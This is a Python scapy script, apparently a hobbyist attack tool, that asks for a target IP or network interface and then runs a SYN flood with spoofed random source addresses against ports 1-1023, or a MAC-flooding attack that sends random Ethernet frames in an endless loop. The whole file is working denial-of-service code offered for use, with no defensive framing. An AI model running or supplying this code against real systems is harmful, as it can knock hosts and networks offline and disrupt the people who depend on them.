#!/usr/bin/python
# Author   : Daniel Magevski
# Description : This scrpit has syn flooding | mac flooding

import sys
import os
from scapy.all import *

if os.geteuid() != 0:
        exit("You need to root prcivileges")

print "####################################################################"
print "                                                                    "
print "                     .-.      .-.                                   "
print "                    /            \                                  "
print "                   |              |                                 "
print "                   | )(|_/  \|_)( |                                 "
print "                   |/     /\     \|                                 "
print "           _       (_     ^^     _)                                 "
print "   _\ ____) \_______\__|IIIIII|__/_______________________________   "
print "  (_)[___]{}<________|-\IIIIII/-|________________________________/  "
print "    /     )_/        \          /                                   "
print "                      \ ______ /                                    "
print "####################################################################"

############FUNCTIONS#################

def syn_flooding():
    print " [*] Ex 192.168.0.1"
    IP_dst = raw_input(" Set IP target: ")

    packet = IP(src=RandIP("*.*.*.*"),
                dst=IP_dst) / \
             TCP(dport=range(1,1024), flags="S")
    print " Press Crtl+C to stop\n"
    print " Flooding target " + IP_dst
    srflood(packet)

def mac_flooding():
    print "[*] Ex eth1"
    dev = raw_input("Set your interface: ")

    packet = Ether(src=RandMAC("*:*:*:*:*:*"),
                   dst=RandMAC("*:*:*:*:*:*")) / \
             IP(src=RandIP("*.*.*.*"),
                dst=RandIP("*.*.*.*")) / \
             ICMP()
    print " Press Crtl+C to stop\n"
    print "Flooding net with random packets on dev " + dev
    sendp(packet, iface=dev, loop=1)



############OPTIONS#################
print "     CHOOSE ONE\n"
print "1 - SYN FLOODING\n"
print "2 - MAC FLOODING\n"
print "3 - EXIT\n"

op = int(input(":* "))

if op == 1:
    syn_flooding()
elif op == 2:
    mac_flooding()
elif op == 3:
    sys.exit()
